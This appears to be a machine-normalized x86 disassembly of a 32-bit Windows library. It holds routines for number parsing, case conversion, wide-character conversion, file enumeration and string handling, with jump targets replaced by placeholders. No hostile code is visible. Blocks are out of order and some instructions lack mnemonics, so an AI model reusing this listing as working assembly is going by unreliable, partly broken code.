call sub_10026495
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_1001b858
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_10026479
cmp eax 0x1
pop ecx
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx cx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_10026911
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10026479
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_10026479
cmp eax 0x1
pop ecx
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_10026065
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_10026479
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10026479
pop ecx
jmp r-xdata
jmp r-xdata
sub_1001baba
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
movzx eax si
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp si cx
je r-xdata
pop esi
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
test edx edx
jne r-xdata
push [ ecx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
push 0x0
call sub_10026ff4
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
mov edi 0x100
cmp si di
pop edi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ esi - 0x61 ]
cmp cx 0x19
ja r-xdata
add esi 0xffffffe0
movzx eax si
jmp r-xdata
sub_1001bb27
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
movzx eax di
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp di cx
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov ecx 0x100
test esi esi
jne r-xdata
push [ edx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push ecx
push esi
push 0x0
call sub_10026ff4
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push ebx
mov ebx ecx
cmp di bx
pop ebx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea ecx [ edi - 0x41 ]
cmp cx 0x19
ja r-xdata
add edi 0x20
movzx eax di
jmp r-xdata
sub_1001bb94
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_100235ad
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
cmp eax ebx
mov cl 0x30
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_10027160
pop ecx
push eax
mov edi r--data
push edi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
inc esi
inc esi
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_10027160
pop ecx
push eax
push edi
call sub_100208d0
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_10026065
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1001bd2f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_100235ad
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_1001bb94
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_10026065
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_1001bdd4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_100235ad
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_1001be97
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10026065
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
jbe r-xdata
sub_1001be97
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_100235ad
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
cmp eax esi
mov cl 0x30
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_10027160
pop ecx
push eax
mov esi r--data
push esi
call sub_100208d0
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
inc edi
inc edi
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_10027200
push [ ebp + 0x10 ]
mov ecx eax
mov eax edx
mov [ ebp - 0x8 ] eax
movsx eax bl
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_10027160
pop ecx
push eax
push esi
call sub_100208d0
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_10026065
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_10027190
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_1001c09c
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001c0be
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_1001c0be
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_10026065
mov esi [ eax ]
call sub_10026065
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_100273d6
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_10026065
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_10026065
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jge r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_1001c13d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_100264e1
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_10026495
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10026911
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_100234af
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_100268cc
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1001c24f
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ebx edx
mov edi edx
and ebx 0x4
and edi 0x80
test dl 0x40
je r-xdata
test dl 0x8
je r-xdata
or edx 0x1
xor ecx ecx
and edx 0xffffff3b
xor eax eax
inc ecx
or edx 0x2
mov esi eax
shl esi 0x2
cmp [ esi + r--data ] 0x0
jne r-xdata
mov ecx [ eax * 4 + r--data ]
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx edx
je r-xdata
push [ ebp + 0x10 ]
mov esi [ esi + rw-data ]
push esi
push [ ebp + 0x8 ]
call sub_100273ed
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test dl 0x1
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
je r-xdata
push [ ebp + 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sub_100273ed
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_100229a0
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_10022e33
pop ecx
jmp r-xdata
sub_1001c347
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
pop ebp
jmp sub_10024d85
sub_1001c3b0
push esi
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop esi
retn
push eax
call [ FindClose@IAT ]
mov [ esi ] 0x0
sub_1001c3f0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
pop esi
jmp edx
sub_1001c430
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea eax [ esi + edi * 2 + 0x4 ]
pop edi
pop esi
retn 0x4
mov esi [ esi + 0x4 ]
lea eax [ esi + edi * 2 ]
pop edi
pop esi
retn 0x4
sub_1001c490
lea eax [ esp - 0x8 ]
sub esp 0x8
cmp eax ecx
je r-xdata
push esi
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x4 ] 0x0
test esi esi
je r-xdata
mov [ ecx ] 0x0
pop esi
add esp 0x8
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
pop esi
add esp 0x8
jmp eax
sub_1001c4f0
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x48 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x44 ] ebx
mov [ esi + 0x34 ] bl
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov eax [ esi + 0x34 ]
push eax
call sub_1002004f
add esp 0x4
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x10 ] bl
mov ecx esi
pop esi
pop ebx
jmp sub_100202c9
mov ecx [ esi + 0x10 ]
push ecx
call sub_1002004f
add esp 0x4
sub_1001c550
push ecx
mov eax ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
push esi
mov esi [ esp + 0xc ]
push eax
push esi
mov [ esp + 0xc ] 0x0
call edx
mov eax esi
pop esi
pop ecx
retn 0x4
sub_1001c5a0
push 0xffffffff
push sub_10047173
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov edx 0x7
xor ecx ecx
xor esi esi
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x4 ] si
mov [ eax + 0x34 ] edx
xor edx edx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x20 ] dx
mov [ eax + 0x50 ] 0xf
mov [ eax + 0x4c ] ecx
mov [ eax + 0x3c ] cl
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
sub_1001c610
push 0xffffffff
push sub_100471a3
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x50 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x50 ] 0xf
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] bl
cmp [ esi + 0x34 ] 0x8
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call sub_1002004f
add esp 0x4
xor edx edx
mov [ esi + 0x34 ] 0x7
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] dx
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov ecx [ esi + 0x20 ]
push ecx
call sub_1002004f
add esp 0x4
xor ecx ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] cx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x4 ]
push eax
call sub_1002004f
add esp 0x4
sub_1001c6b0
push 0xffffffff
push sub_100471c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esp + 0x24 ]
push eax
call sub_10001d6b
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
xor eax eax
mov [ esi ] r--data
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] edx
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x34 ] al
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0xc
sub_1001c720
push 0xffffffff
push sub_10047211
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x3c ]
xor eax eax
push 0xffffffff
push eax
mov [ esp + 0x10 ] 0x0
push ecx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] ax
call sub_10002033
mov edx [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x10 ]
mov [ esp + 0x34 ] 0x1
call sub_1001ea50
mov esi [ esp + 0x38 ]
xor ecx ecx
push 0xffffffff
push ecx
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
push eax
mov ecx esi
call sub_10002033
cmp [ esp + 0x24 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x2c
retn
mov edx [ esp + 0x10 ]
push edx
call sub_1002004f
add esp 0x4
sub_1001c800
push ebp
mov ebp esp
push 0xffffffff
push sub_10047238
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
cmp [ esi + 0x44 ] 0x0
mov ebx 0x10
jne r-xdata
cmp [ esi + 0x48 ] ebx
jb r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x24 ] ebx
jb r-xdata
lea eax [ esi + 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ esi + 0x10 ]
mov edx [ esi + 0x10 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
lea edi [ esi + 0x30 ]
push edx
mov ecx edi
call sub_100024af
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov eax edx
lea edi [ eax + 0x1 ]
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ esi + 0x28 ]
call sub_1001c550
push 0xffffffff
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_10006f9b
cmp [ ebp - 0x18 ] ebx
jb r-xdata
push 0x2
push r--data
mov ecx edi
call sub_10007042
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1002004f
add esp 0x4
sub_1001c930
push 0xffffffff
push sub_1004726b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x278
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x274 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28c ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x29c ]
mov ecx [ esp + 0x2a8 ]
mov ebx [ esp + 0x2a0 ]
mov esi [ esp + 0x2ac ]
mov ebp [ esp + 0x2b0 ]
push 0xffffffff
xor edi edi
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x2a8 ]
push edi
mov [ esp + 0x20 ] ecx
xor edx edx
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x3c ] edi
mov [ esp + 0x2c ] dx
call sub_10002033
mov eax [ esp + 0x30 ]
mov [ esp + 0x294 ] edi
cmp eax edi
je r-xdata
mov edx r--data
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ esp + 0x24 ]
call sub_10009bf9
mov eax [ esp + 0x20 ]
mov edi 0x8
cmp [ esp + 0x34 ] edi
jae r-xdata
cmp [ esp + 0x34 ] 0x8
mov ecx [ esp + 0x20 ]
jae r-xdata
call sub_1002059f
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x38 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebx ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0x20 ]
cmp [ ecx + edi * 2 ] 0x5c
je r-xdata
lea ecx [ esp + 0x20 ]
lea eax [ esp + 0x64 ]
lea edx [ eax + 0x2 ]
mov edi [ GetLastError@IAT ]
mov [ ebx ] 0x0
call edi
cmp eax 0x2
je r-xdata
mov edx r--data
jmp r-xdata
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ esp + 0x18 ]
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x68 ]
push eax
call sub_1000155d
mov eax [ esp + 0x38 ]
test eax 0x400
je r-xdata
xor esi esi
call edi
cmp eax 0x12
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
lea ecx [ ecx ]
cmp [ esp + 0x34 ] 0x8
mov ecx [ esp + 0x20 ]
jae r-xdata
call sub_1002059f
mov eax [ esp + 0x30 ]
test al 0x10
je r-xdata
mov [ esi ] 0x0
mov [ ebp ] 0x0
